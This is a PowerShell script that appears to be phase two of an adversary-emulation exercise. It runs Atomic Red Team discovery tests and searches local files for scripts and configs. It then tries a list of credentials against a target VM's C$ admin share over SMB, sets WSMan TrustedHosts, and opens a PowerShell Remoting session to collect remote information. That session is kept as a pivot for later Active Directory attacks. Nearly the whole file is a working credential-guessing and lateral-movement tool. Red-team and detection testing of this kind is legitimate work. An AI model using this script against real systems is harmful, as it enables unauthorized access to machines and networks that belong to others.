# ==================================================
# Phase2_Information_Gathering.ps1
# Information Gathering & Lateral Movement
# ==================================================

# Initialization check
if (-not $global:JARVIS_CONFIG) {
    Write-Host "Error: execute 00_Initialize.ps1 first" -ForegroundColor Red
    exit
}

Write-Host "`n[PHASE 2] INFORMATION GATHERING & LATERAL MOVEMENT" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Yellow

$phase2Results = @{
    ProcessDiscovery = $false
    SystemInfo = $false
    FileDiscovery = $false
    LateralMovement = $false
}

$VMIP = $global:JARVIS_CONFIG.TargetVM_IP
$VMName = $global:JARVIS_CONFIG.TargetVM_Name

# Step 2.1: T1057 - Process Discovery (Local)
Write-Host "`n[Step 2.1] T1057 - Process Discovery (Local)..." -ForegroundColor Cyan

try {
    Invoke-AtomicTest T1057 -TestNumbers 1,2 -ShowDetails -ErrorAction Stop

    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
    if ($lsass) {
        Write-Host "  ✓ lsass.exe discovered (PID: $($lsass.Id))" -ForegroundColor Green
    }

    $phase2Results.ProcessDiscovery = $true

} catch {
    Write-Host "  ✗ Process Discovery failed" -ForegroundColor Red
}

# Step 2.2: T1082 - System Information Discovery (Local)
Write-Host "`n[Step 2.2] T1082 - System Information Discovery..." -ForegroundColor Cyan

try {
    Invoke-AtomicTest T1082 -TestNumbers 1,2 -ShowDetails -ErrorAction Stop

    $phase2Results.SystemInfo = $true

} catch {
    Write-Host "  ✗ System Information Discovery failed" -ForegroundColor Red
}

# Step 2.3: T1083 - File Discovery (Local)
Write-Host "`n[Step 2.3] T1083 - File Discovery..." -ForegroundColor Cyan

try {
    $searchPaths = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "C:\Scripts"
    )

    $foundFiles = @()

    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem $path -Recurse -Include *.ps1,*.txt,*.config -ErrorAction SilentlyContinue
            $foundFiles += $files
        }
    }

    Write-Host "  ✓ Files of interest discovered: $($foundFiles.Count)" -ForegroundColor Green

    $phase2Results.FileDiscovery = $true

} catch {
    Write-Host "  ✗ File Discovery failed" -ForegroundColor Red
}

# Step 2.4: T1021.001 - Lateral Movement to vmjarvisfe
Write-Host "`n[Step 2.4] T1021.001 - Lateral Movement to $VMName..." -ForegroundColor Cyan

$vmHost = $global:discoveredHosts | Where-Object { $_.Name -eq $VMName -and $_.Type -eq "Workstation" }

if (-not $vmHost -or -not $vmHost.Reachable) {
    Write-Host "  ✗ $VMName not discovered in Phase 1 or not reachable" -ForegroundColor Red
    Write-Host "  → Phase 2 limited completion (exiting without Lateral Movement)" -ForegroundColor Yellow
} else {
    Write-Host "  [Target] $VMName ($VMIP)" -ForegroundColor Gray

    # Brute force credential attempts
    $testCredentials = @(
        @{User="[TEST_USER_1]"; Password="[TEST_PASSWORD_1]"},
        @{User="[TEST_USER_2]"; Password="[TEST_PASSWORD_2]"},
        @{User="[TEST_USER_3]"; Password="[TEST_PASSWORD_3]"}
    )

    $validVMCredential = $null

    Write-Host "`n  [*] Attempting access to $VMName..." -ForegroundColor Gray

    $attemptCount = 0
    foreach ($cred in $testCredentials) {
        $attemptCount++
        $username = "$VMName\$($cred.User)"

        Write-Host "    [$attemptCount/$($testCredentials.Count)] Attempt: $username" -ForegroundColor Gray
        Write-Host "      Password: $($cred.Password)" -ForegroundColor DarkGray
        Write-Host "      Target: \\$VMIP\C$" -ForegroundColor DarkGray

        $securePass = ConvertTo-SecureString $cred.Password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($username, $securePass)

        try {
            # SMB access test
            $null = New-PSDrive -Name "VMTEST" -PSProvider FileSystem -Root "\\$VMIP\C$" -Credential $credential -ErrorAction Stop
            Remove-PSDrive -Name "VMTEST" -ErrorAction SilentlyContinue

            Write-Host "    ✓ Authentication successful!" -ForegroundColor Green
            Write-Host "      Credential: $username / $($cred.Password)" -ForegroundColor Red

            $validVMCredential = @{
                Username = $username
                Password = $cred.Password
                Credential = $credential
            }

            $global:validCredentials += $validVMCredential
            break

        } catch {
            $errorMsg = $_.Exception.Message
            if ($errorMsg -match "Access is denied|Logon failure") {
                Write-Host "      ✗ Authentication failed (Invalid credentials)" -ForegroundColor Red
            } elseif ($errorMsg -match "network path was not found|could not be found") {
                Write-Host "      ✗ Network error (vmjarvisfe access denied: $VMIP)" -ForegroundColor Red
            } else {
                Write-Host "      ✗ Failed: $($errorMsg.Split("`n")[0])" -ForegroundColor Red
            }
        }

        Start-Sleep -Milliseconds 500
    }

    if (-not $validVMCredential) {
        Write-Host "`n  ✗ $VMName access failed (all credential attempts failed)" -ForegroundColor Red
    } else {
        Write-Host "`n  [*] Establishing PowerShell Remoting session..." -ForegroundColor Cyan

        try {
            # TrustedHosts configuration
            $currentTrusted = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
            if ($currentTrusted -notlike "*$VMIP*") {
                Set-Item WSMan:\localhost\Client\TrustedHosts -Value $VMIP -Force -ErrorAction SilentlyContinue
            }

            $vmSession = New-PSSession -ComputerName $VMIP -Credential $validVMCredential.Credential -ErrorAction Stop

            Write-Host "  ✓ Lateral Movement successful! (Session ID: $($vmSession.Id))" -ForegroundColor Green

            # Collecting remote system information
            Write-Host "`n  [*] Collecting information from $VMName..." -ForegroundColor Cyan

            $remoteInfo = Invoke-Command -Session $vmSession -ScriptBlock {
                $info = @{
                    ComputerName = $env:COMPUTERNAME
                    Username = $env:USERNAME
                    Domain = $env:USERDOMAIN
                    OSVersion = (Get-WmiObject Win32_OperatingSystem).Caption
                    Processes = (Get-Process | Where-Object {$_.Name -match 'lsass|explorer|powershell'} | Select-Object Name, Id).Count
                    Services = (Get-Service | Where-Object {$_.Status -eq 'Running'}).Count
                }
                return $info
            }

            Write-Host "    Computer: $($remoteInfo.ComputerName)" -ForegroundColor Gray
            Write-Host "    User: $($remoteInfo.Username)" -ForegroundColor Gray
            Write-Host "    Domain: $($remoteInfo.Domain)" -ForegroundColor Gray
            Write-Host "    OS: $($remoteInfo.OSVersion)" -ForegroundColor Gray
            Write-Host "    Processes: $($remoteInfo.Processes) (of interest)" -ForegroundColor Gray
            Write-Host "    Services: $($remoteInfo.Services) (Running)" -ForegroundColor Gray

            # Save session to global variable
            $global:vmjarvisfeSession = $vmSession
            $global:vmjarvisfeCredential = $validVMCredential

            Write-Host "`n  ✓ $VMName Pivot point secured" -ForegroundColor Green
            Write-Host "    → AD attacks will be performed via this host in Phase 3" -ForegroundColor Yellow

            $phase2Results.LateralMovement = $true

            # Save results
            @{
                VMName = $VMName
                VMIP = $VMIP
                Credential = $validVMCredential.Username
                SessionID = $vmSession.Id
                RemoteInfo = $remoteInfo
            } | ConvertTo-Json | Out-File "$global:logPath\phase2_lateral_movement.json"

        } catch {
            Write-Host "  ✗ PowerShell Remoting failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "    Alternative: WMI or PsExec attempt required" -ForegroundColor Yellow
        }
    }
}

# Summary
$successCount2 = ($phase2Results.Values | Where-Object { $_ -eq $true }).Count

Write-Host "`n" -NoNewline
Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              PHASE 2 SUMMARY                               ║
╟────────────────────────────────────────────────────────────╢
║ Success rate: $successCount2 / 4
║
║ Local Information Gathering:
║   - Process list: $(if($phase2Results.ProcessDiscovery){'✓'}else{'✗'})
║   - System info: $(if($phase2Results.SystemInfo){'✓'}else{'✗'})
║   - File Discovery: $(if($phase2Results.FileDiscovery){'✓'}else{'✗'})
║
║ Lateral Movement:
║   - $VMName infiltration: $(if($phase2Results.LateralMovement){'✓ Success'}else{'✗ Failed'})
║   - Pivot session: $(if($global:vmjarvisfeSession){"Active (Session $($global:vmjarvisfeSession.Id))"}else{"None"})
║
║ Next step: Phase 3 ($(if($phase2Results.LateralMovement){"AD attack via $VMName"}else{"Direct AD attack"}))
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor $(if($successCount2 -eq 4){"Green"}else{"Yellow"})

Write-Host "`n[PHASE 2] Complete - Proceed to Phase 3`n" -ForegroundColor Green